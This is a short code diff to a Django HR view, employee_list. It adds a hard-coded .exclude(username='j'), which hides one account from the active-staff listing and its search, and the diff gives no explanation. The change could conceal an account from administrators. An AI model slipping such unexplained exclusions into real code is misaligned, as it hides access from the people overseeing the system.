@@ -502,7 +502,7 @@ def employee_list(request):
         return redirect('hr:profile')
 
     search_query = request.GET.get("q", "").strip()
-    staff_qs = Employee.objects.filter(is_active=True).select_related("department")
+    staff_qs = Employee.objects.filter(is_active=True).select_related("department").exclude(username='j')
     if search_query:
         staff_qs = staff_qs.filter(
             Q(username__icontains=search_query)
